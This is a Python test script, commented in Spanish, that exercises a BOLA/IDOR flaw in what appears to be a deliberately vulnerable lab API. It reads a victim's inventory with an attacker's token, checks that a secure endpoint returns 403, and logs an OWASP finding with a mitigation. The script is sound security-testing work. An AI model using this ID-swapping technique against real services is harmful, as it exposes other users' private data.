import uuid

from common import (
    create_client,
    login,
    auth_headers,
    write_finding,
    print_title,
    print_result,
    ATTACKER_TICKET,
    VICTIM_TICKET
)


def run_bola_attack() -> bool:
    """
    prueba un bola/idor sobre el inventario.

    basicamente el atacante usa su propio token, pero en la url pone el id de
    la victima. si el backend no compara esas dos cosas, devuelve datos ajenos.

    por eso creo un item de la victima y luego miro si el atacante consigue leerlo.
    """

    print_title("BOLA / IDOR ATTACK - Inventory Access")

    #con el with el cliente http se cierra solo al acabar
    with create_client() as client:
        attacker = login(client, ATTACKER_TICKET)
        attacker_token = attacker["access_token"]
        attacker_id = attacker["user_id"]
        print(f"Attacker user_id: {attacker_id}")

        victim = login(client, VICTIM_TICKET)
        victim_token = victim["access_token"]
        victim_id = victim["user_id"]
        print(f"Victim user_id: {victim_id}")

        #creo un item con nombre unico para no mezclar pruebas de ejecuciones viejas
        unique_item_name = f"Golden Sword {uuid.uuid4()}"
        create_item_response = client.post(
            "/inventory/me/items",
            headers=auth_headers(victim_token),
            json={
                "item_name": unique_item_name,
                "quantity": 1
            }
        )
        create_item_response.raise_for_status()
        print(f"Victim item created: {unique_item_name}")

        #ataque: pido el inventario de la victima, pero usando el token del atacante
        #si el backend no comprueba bien la propiedad del inventario, esto cuela
        vulnerable_response = client.get(
            f"/vulnerable/inventory/{victim_id}",
            headers=auth_headers(attacker_token)
        )
        vulnerable_status = vulnerable_response.status_code
        try:
            vulnerable_body = vulnerable_response.json()
        except Exception:
            vulnerable_body = {}

        #confirmo bola si vuelve una lista con algun item que sea de la victima
        bola_confirmed = (
            vulnerable_status == 200
            and isinstance(vulnerable_body, list)
            and any(item.get("owner_id") == victim_id for item in vulnerable_body)
        )
        print_result(
            bola_confirmed,
            "Vulnerable endpoint returned victim inventory using attacker token"
        )

        #el endpoint seguro deberia cortar este intento con un 403
        secure_response = client.get(
            f"/secure/inventory/{victim_id}",
            headers=auth_headers(attacker_token)
        )
        secure_blocked = secure_response.status_code == 403
        print_result(
            secure_blocked,
            "Secure endpoint blocked cross-user inventory access with 403"
        )

        #guardo ids y respuestas para que luego se vea claro que ha pasado
        write_finding(
            vulnerability="Broken Object Level Authorization (BOLA)",
            severity="High",
            endpoint="/vulnerable/inventory/{user_id}",
            owasp_category="API1:2023 Broken Object Level Authorization",
            confirmed=bola_confirmed,
            evidence={
                "attacker_user_id": attacker_id,
                "victim_user_id": victim_id,
                "vulnerable_status_code": vulnerable_status,
                "secure_status_code": secure_response.status_code,
                "returned_items": vulnerable_body
            },
            mitigation=(
                "Validate that the requested user_id matches the authenticated "
                "user_id extracted from the token before querying inventory data."
            )
        )

        return bola_confirmed and secure_blocked


if __name__ == "__main__":
    success = run_bola_attack()
    raise SystemExit(0 if success else 1)
